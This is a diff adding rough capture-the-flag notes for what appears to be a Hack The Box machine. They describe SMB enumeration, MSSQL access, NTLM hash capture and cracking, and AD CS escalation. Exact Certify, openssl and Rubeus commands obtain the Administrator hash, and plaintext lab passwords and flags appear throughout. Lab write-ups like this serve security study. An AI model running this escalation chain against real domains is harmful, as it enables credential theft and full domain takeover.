@@ -1,0 +1,68 @@
+nmap scanning .
+some port need look on : ldap,ms-sql,smb,Samba,Winrm,..
+
+get the file on SMB server -> read that by using evince tool ( pdf viewer on linux)
+
+some note : Ryan,Tom,Brandon
+
+user PublicUser and password GuestUserCantWrite1 .
+
+cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password> -> this can notice about the server we need to get. ->sequel.htb
+
+use mssqlclient.py to login that SQL server : python3 mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@sequel.htb
+
+->> use hacktrick book might helpful : https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection
+
+make a smbserver with the file smbserver.py and fetch the path->> get the NTLM hash -> crak with john and get the user and password 
+
+sql_svc
+REGGIE1234ronnie
+
+
+-> login with evil-winrm
+
+some note : Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided.
+Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided.
+
+-> try to login ?
+
+-> got this from file user.txt in Ryan.Cooper(NuclearMosquito3) desktop : 0d76d9f4c950d9fae209ee4360047f0d
+
+-> need become Adminstrator ..
+
+look back about result from nmap scanning port 389/UDP is open -> this could make AD CS Domain Escalation
+
+
+->> check certificate in this windows machine ->
+
+source note : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
+
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/
+
+https://github.com/GhostPack/Certify -> example 
+
+--> upload file nescessary .
+
+-> exploit -> got some important info from running ./certify file.-> -> we can fetch new request to get admin cer about this vuln.
+
+-> exploit : .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator (from hacktrickbook)
+
+got the certificate in adminstrator but it in PEM format (need covert )
+
+
+->> openssl pkcs12 -export -in cer.pem -inkey private.key -out cert.pfx -name "certificate_export" -CSP "Microsoft Enhanced Cryptographic Provider v1.0"
+
+-> covert to .pfx 
+upload file Rubeus.exe to the target machine.
+
+run Rubeus.exe : .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
+
+->> get the NTLM hash of adminstrator : A52F78E4C751E5F5E17E1E9F3E58F4EE -> login as admin and get the root flag.
+
+
+
+
+
+
+
+
